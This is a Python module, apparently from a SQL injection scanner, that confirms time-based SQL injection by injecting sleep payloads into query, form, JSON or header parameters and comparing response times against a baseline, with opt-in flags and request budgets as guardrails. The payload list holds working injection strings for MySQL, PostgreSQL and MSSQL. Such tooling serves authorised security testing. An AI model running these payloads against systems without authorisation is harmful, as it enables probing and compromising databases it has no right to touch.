"""
Time-based Confirmation with Strict Guardrails
================================================

Provides ``TimedConfirmation`` – an **opt-in** confirmation step that uses
sleep-based payloads to verify SQL injection when other signals are inconclusive.

Safety guarantees
-----------------
* Strict per-request delay cap (``max_delay_seconds``, default 3 s).
* Per-endpoint probe limit (``max_requests_per_endpoint``).
* Per-host total probe budget shared across all endpoints.
* Repeated measurements (configurable ``repetitions``) with median/average
  comparison to reduce false positives from network jitter.
* All consumed budget is tracked and exposed so callers can enforce global
  limits.

Usage::

    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.engine.timeguard import TimedConfirmation, TimeBasedResult

    cfg = ScanConfig(
        time_based_enabled=True,
        time_based_max_delay_seconds=3,
        time_based_max_requests_per_endpoint=6,
        time_based_max_requests_per_host=20,
    )

    def my_request_fn(url, method, params, data, json_data, headers, cookies):
        import requests
        return requests.request(method, url, params=params, timeout=15)

    tc = TimedConfirmation(request_fn=my_request_fn, config=cfg)
    result = tc.confirm(
        url="https://example.com/search",
        method="GET",
        params={"q": "test"},
        inject_param="q",
        inject_location="query_param",
        baseline_median_ms=120.0,
    )
    if result.confirmed:
        print("Time-based injection confirmed!")
        print(f"  Median delay: {result.median_injected_ms:.0f} ms")
        print(f"  Baseline: {result.baseline_median_ms:.0f} ms")
"""

from __future__ import annotations

import logging
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from .config import ScanConfig

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

#: Additional seconds added to the sleep delay to form the per-request hard
#: timeout cap.  Accounts for network round-trip and server processing overhead.
_RESPONSE_OVERHEAD_SECONDS: int = 5

#: A sleep payload is considered confirmed when the observed median response
#: time is at least this fraction of the expected delay above the baseline.
#: 0.8 means 80 % of the configured delay must be observed (tolerates minor
#: network jitter or server-side scheduling imprecision).
_DELAY_TOLERANCE_FACTOR: float = 0.8

# ---------------------------------------------------------------------------
# Sleep payload templates (by location)
# ---------------------------------------------------------------------------

_SLEEP_PAYLOADS: List[str] = [
    # MySQL / MariaDB
    "'; SELECT SLEEP({delay})--",
    "' AND SLEEP({delay})--",
    "1 AND SLEEP({delay})",
    # PostgreSQL
    "'; SELECT pg_sleep({delay})--",
    "' AND 1=(SELECT 1 FROM pg_sleep({delay}))--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "' AND 1=1; WAITFOR DELAY '0:0:{delay}'--",
    # SQLite (no built-in sleep; use heavy computation approximation)
    # Generic (works on some backends)
    "' OR SLEEP({delay})--",
]


def build_sleep_payload(template: str, delay_seconds: int) -> str:
    """Return a sleep payload with the given delay substituted."""
    return template.replace("{delay}", str(delay_seconds))


# ---------------------------------------------------------------------------
# TimeBasedResult
# ---------------------------------------------------------------------------


@dataclass
class TimeBasedResult:
    """Result of a time-based confirmation attempt.

    Attributes
    ----------
    confirmed:
        ``True`` when the injected payloads caused statistically significant
        delays compared to the baseline.
    baseline_median_ms:
        Median response time without any injection, in milliseconds.
    injected_samples_ms:
        Raw response times observed with the sleep payload, in milliseconds.
    median_injected_ms:
        Median of *injected_samples_ms*, in milliseconds.
    expected_delay_ms:
        The expected minimum delay introduced by the payload, in milliseconds.
    requests_used:
        Number of HTTP requests consumed by this confirmation attempt.
    payload_used:
        The sleep payload template that produced the confirmation (or ``""``
        when none was confirmed).
    rationale:
        Human-readable explanation of the result.
    """

    confirmed: bool
    baseline_median_ms: float
    injected_samples_ms: List[float]
    median_injected_ms: float
    expected_delay_ms: float
    requests_used: int
    payload_used: str
    rationale: str

    @property
    def delay_factor(self) -> float:
        """Ratio of median injected time to baseline median.

        A value significantly > 1.0 (e.g. > 1.5 or 2.0) is a strong indicator
        of time-based injection.
        """
        if self.baseline_median_ms <= 0:
            return 0.0
        return self.median_injected_ms / self.baseline_median_ms


# ---------------------------------------------------------------------------
# PerHostBudget
# ---------------------------------------------------------------------------


class PerHostBudget:
    """Thread-safe per-host request budget tracker.

    Parameters
    ----------
    max_requests_per_host:
        Maximum total time-based probe requests allowed per host.
    """

    def __init__(self, max_requests_per_host: int) -> None:
        self._max = max_requests_per_host
        self._counts: Dict[str, int] = {}
        self._lock = threading.Lock()

    def consume(self, host: str, n: int = 1) -> bool:
        """Attempt to consume *n* requests from the budget for *host*.

        Returns ``True`` on success (budget was available), ``False`` when the
        budget is exhausted.
        """
        with self._lock:
            current = self._counts.get(host, 0)
            if current + n > self._max:
                return False
            self._counts[host] = current + n
            return True

    def remaining(self, host: str) -> int:
        """Return the remaining budget for *host*."""
        with self._lock:
            return max(0, self._max - self._counts.get(host, 0))

    def reset(self, host: Optional[str] = None) -> None:
        """Reset the budget for *host*, or all hosts when *host* is ``None``."""
        with self._lock:
            if host is None:
                self._counts.clear()
            else:
                self._counts.pop(host, None)


# ---------------------------------------------------------------------------
# TimedConfirmation
# ---------------------------------------------------------------------------


def _median(values: List[float]) -> float:
    """Return the median of a non-empty sequence of floats."""
    sv = sorted(values)
    n = len(sv)
    mid = n // 2
    if n % 2 == 0:
        return (sv[mid - 1] + sv[mid]) / 2.0
    return sv[mid]


class TimedConfirmation:
    """Opt-in time-based SQL injection confirmation with strict guardrails.

    Parameters
    ----------
    request_fn:
        ``(url, method, params, data, json_data, headers, cookies) -> response | None``
        compatible with ``requests.Response``.
    config:
        :class:`~sql_attacker.engine.config.ScanConfig`.  Must have
        ``time_based_enabled=True``; otherwise :meth:`confirm` always returns
        a not-confirmed result.
    host_budget:
        Optional :class:`PerHostBudget` instance.  One is created internally
        when not provided.
    """

    def __init__(
        self,
        request_fn: Callable,
        config: Optional[ScanConfig] = None,
        host_budget: Optional[PerHostBudget] = None,
    ) -> None:
        self._request_fn = request_fn
        self._cfg = config or ScanConfig()
        self._host_budget = host_budget or PerHostBudget(
            max_requests_per_host=self._cfg.time_based_max_requests_per_host
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def confirm(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        json_data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        inject_param: str = "",
        inject_location: str = "query_param",
        baseline_median_ms: Optional[float] = None,
        repetitions: int = 3,
    ) -> TimeBasedResult:
        """Attempt time-based confirmation for *inject_param*.

        The method is **disabled** when ``config.time_based_enabled`` is
        ``False`` and returns a not-confirmed result immediately.

        Args:
            url:               Target URL.
            method:            HTTP method.
            params:            URL query parameters.
            data:              Form-encoded POST body.
            json_data:         JSON body dict.
            headers:           Request headers.
            cookies:           Request cookies.
            inject_param:      Name of the parameter to inject into.
            inject_location:   Location of the parameter (``"query_param"``,
                               ``"form_param"``, ``"json_param"``,
                               ``"header"``).
            baseline_median_ms: Pre-measured baseline median in ms.  When
                               provided, skips the built-in baseline step.
            repetitions:       How many sleep-payload requests to send per
                               candidate payload template.

        Returns:
            :class:`TimeBasedResult`
        """
        if not self._cfg.time_based_enabled:
            return TimeBasedResult(
                confirmed=False,
                baseline_median_ms=baseline_median_ms or 0.0,
                injected_samples_ms=[],
                median_injected_ms=0.0,
                expected_delay_ms=0.0,
                requests_used=0,
                payload_used="",
                rationale="Time-based detection is disabled (time_based_enabled=False).",
            )

        from urllib.parse import urlparse

        host = urlparse(url).hostname or url
        delay_s = int(self._cfg.time_based_max_delay_seconds)
        max_per_endpoint = self._cfg.time_based_max_requests_per_endpoint
        reps = max(1, min(repetitions, max_per_endpoint // max(1, len(_SLEEP_PAYLOADS))))

        # 1. Collect baseline if not pre-supplied
        if baseline_median_ms is None:
            baseline_samples = self._collect_timing_samples(
                url, method, params, data, json_data, headers, cookies,
                n=3,
            )
            if not baseline_samples:
                return TimeBasedResult(
                    confirmed=False,
                    baseline_median_ms=0.0,
                    injected_samples_ms=[],
                    median_injected_ms=0.0,
                    expected_delay_ms=0.0,
                    requests_used=0,
                    payload_used="",
                    rationale="Could not establish baseline (all requests failed).",
                )
            baseline_median_ms = _median(baseline_samples)

        total_requests = 0

        # 2. Try each payload template
        for template in _SLEEP_PAYLOADS:
            if not self._host_budget.consume(host, n=reps):
                logger.warning(
                    "Time-based budget exhausted for %s. Stopping.", host
                )
                break
            if total_requests >= max_per_endpoint:
                break

            payload = build_sleep_payload(template, delay_s)
            injected_params, injected_data, injected_json, injected_headers = (
                self._inject_payload(
                    inject_param, inject_location, payload,
                    params or {}, data or {}, json_data or {}, headers or {},
                )
            )

            samples_ms: List[float] = []
            for _ in range(reps):
                t_start = time.monotonic()
                resp = self._do_request(
                    url, method,
                    injected_params, injected_data, injected_json,
                    injected_headers, cookies or {},
                )
                elapsed_ms = (time.monotonic() - t_start) * 1000.0
                total_requests += 1

                if resp is None:
                    continue

                # Only count responses that didn't exceed a hard cap
                hard_cap_ms = (delay_s + _RESPONSE_OVERHEAD_SECONDS) * 1000.0
                if elapsed_ms <= hard_cap_ms:
                    samples_ms.append(elapsed_ms)

            if not samples_ms:
                continue

            median_injected_ms = _median(samples_ms)
            expected_delay_ms = delay_s * 1000.0
            min_expected = baseline_median_ms + expected_delay_ms * _DELAY_TOLERANCE_FACTOR

            if median_injected_ms >= min_expected:
                rationale = (
                    f"Time-based injection confirmed: median={median_injected_ms:.0f}ms "
                    f"(baseline={baseline_median_ms:.0f}ms, "
                    f"expected_min={min_expected:.0f}ms) "
                    f"after {reps} repetitions."
                )
                logger.info("TimedConfirmation: %s", rationale)
                return TimeBasedResult(
                    confirmed=True,
                    baseline_median_ms=baseline_median_ms,
                    injected_samples_ms=samples_ms,
                    median_injected_ms=median_injected_ms,
                    expected_delay_ms=expected_delay_ms,
                    requests_used=total_requests,
                    payload_used=payload,
                    rationale=rationale,
                )

        # No payload confirmed
        rationale = (
            f"Time-based injection NOT confirmed after {total_requests} probe requests. "
            f"Baseline median: {baseline_median_ms:.0f}ms."
        )
        logger.info("TimedConfirmation: %s", rationale)
        return TimeBasedResult(
            confirmed=False,
            baseline_median_ms=baseline_median_ms,
            injected_samples_ms=[],
            median_injected_ms=0.0,
            expected_delay_ms=float(delay_s * 1000),
            requests_used=total_requests,
            payload_used="",
            rationale=rationale,
        )

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _collect_timing_samples(
        self,
        url: str,
        method: str,
        params: Optional[Dict],
        data: Optional[Dict],
        json_data: Optional[Dict],
        headers: Optional[Dict],
        cookies: Optional[Dict],
        n: int = 3,
    ) -> List[float]:
        """Return a list of baseline response times in milliseconds."""
        samples: List[float] = []
        for _ in range(n):
            t0 = time.monotonic()
            resp = self._do_request(url, method, params, data, json_data, headers, cookies)
            elapsed_ms = (time.monotonic() - t0) * 1000.0
            if resp is not None:
                samples.append(elapsed_ms)
        return samples

    def _do_request(
        self,
        url: str,
        method: str,
        params: Optional[Dict],
        data: Optional[Dict],
        json_data: Optional[Dict],
        headers: Optional[Dict],
        cookies: Optional[Dict],
    ) -> Optional[Any]:
        """Make a single HTTP request, suppressing exceptions."""
        try:
            return self._request_fn(url, method, params, data, json_data, headers, cookies)
        except Exception as exc:
            logger.debug("TimedConfirmation request failed: %s", exc)
            return None

    @staticmethod
    def _inject_payload(
        param: str,
        location: str,
        payload: str,
        params: Dict,
        data: Dict,
        json_data: Dict,
        headers: Dict,
    ) -> tuple:
        """Return (params, data, json_data, headers) with payload injected."""
        new_params = dict(params)
        new_data = dict(data)
        new_json = dict(json_data)
        new_headers = dict(headers)

        if location == "query_param":
            new_params[param] = payload
        elif location == "form_param":
            new_data[param] = payload
        elif location == "json_param":
            new_json[param] = payload
        elif location == "header":
            new_headers[param] = payload

        return new_params, new_data, new_json, new_headers
